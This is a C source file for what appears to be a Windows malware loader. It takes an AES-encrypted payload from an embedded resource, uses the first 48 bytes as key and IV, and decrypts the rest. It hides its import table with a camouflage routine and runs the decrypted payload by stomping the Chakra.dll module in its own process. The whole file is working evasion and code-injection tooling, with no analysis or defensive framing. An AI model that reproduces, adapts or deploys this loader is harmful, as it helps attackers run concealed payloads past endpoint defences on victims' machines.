#include <Macros.h>
#include <windows.h>
#include <Utils.h>
#include <stdio.h>
#include <Aes.h>

// INT APIENTRY WinMain(
//     HINSTANCE hInstance, 
//     HINSTANCE hPrevInstance,
//     PSTR lpCmdLine, 
//     INT nCmdShow
// )


INT main()
{

    IatCamouflage();

    PBYTE pBuffer = _malloc( 10000 );
    SIZE_T bufferSize = 0;

    PBYTE IV    = _malloc( 16), 
          Key   = _malloc(32), 
          Payload = NULL; 

    PBYTE DecPayload = NULL;


    if ( ! GetResourceFile( GetModuleHandle(NULL), 101, &pBuffer, &bufferSize )) {
        PRINTA("[!] Failed\n");
    }

    PRINTA("[+] Fetched Resource @ 0x%p [ %ld ]", pBuffer, bufferSize);
    
    Payload = _malloc( bufferSize - 48 );


    MmCopy( Key, pBuffer, 32 );
    MmCopy( IV, (pBuffer + 32), 16 );
    MmCopy( Payload, (pBuffer+48), (bufferSize - 48));

    _free( pBuffer );


    if ( ! (InstallAesDecryptionViaCtAes( Payload, (bufferSize - 48), Key, IV, &DecPayload) )) {
        PRINTA("[!] Failed to decrypt\n");
        return -1;
    }
    // PrintHexArray(DecPayload, 16);


    PHANDLE Thread = NULL; 
    
    if ( ! ( StompModule( NtCurrentProcess(), L"C:\\Windows\\System32\\Chakra.dll", DecPayload,  (bufferSize - 48), &Thread) )) {
        PRINTA("[!] Failed to stomp the module \n");
        return -1;
    }

    PRINTA("[+] Thread => 0x%p\n", Thread);

    _free(IV);
    _free(Key);
    _free(Payload);


    return 0;

}